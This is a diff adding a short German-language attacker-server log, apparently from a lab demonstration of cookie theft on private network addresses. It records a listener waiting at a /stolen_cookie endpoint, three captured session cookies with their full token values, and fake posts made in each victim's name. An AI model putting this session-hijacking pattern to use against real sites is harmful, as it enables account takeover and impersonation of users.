@@ -1,0 +1,11 @@
+[2025-06-16T11:26:43.169Z] Angreiferserver l├ñuft auf http://0.0.0.0:8080
+[2025-06-16T11:26:43.170Z] Warte auf gestohlene Cookies unter http://10.30.142.94:8080/stolen_cookie
+[2025-06-16T11:28:27.140Z] GESTOHLENES COOKIE EMPFANGEN von IP: 10.30.142.94:
+[2025-06-16T11:28:27.140Z] Cookie: connect.sid=s:SiNOnE98SeCfT0ydPI_9XqdKKli9o-rW.f18ey4OUO5UnRbt2bYHmCpf38iTA02Gw9WPpAOE+eQM
+[2025-06-16T11:28:27.176Z] ERFOLG: Fake Post im Namen des Opfers erstellt.
+[2025-06-16T11:28:40.556Z] GESTOHLENES COOKIE EMPFANGEN von IP: 10.30.142.99:
+[2025-06-16T11:28:40.556Z] Cookie: connect.sid=s:3b2Lvtgd5VokwK51glIChyAHUS95s-n6.rziFwSEprXzlycfRL3jiastJek8bE+XzwVB1ASjEp7E
+[2025-06-16T11:28:40.580Z] ERFOLG: Fake Post im Namen des Opfers erstellt.
+[2025-06-16T11:28:49.153Z] GESTOHLENES COOKIE EMPFANGEN von IP: 10.30.142.99:
+[2025-06-16T11:28:49.153Z] Cookie: connect.sid=s:3b2Lvtgd5VokwK51glIChyAHUS95s-n6.rziFwSEprXzlycfRL3jiastJek8bE+XzwVB1ASjEp7E
+[2025-06-16T11:28:49.172Z] ERFOLG: Fake Post im Namen des Opfers erstellt.
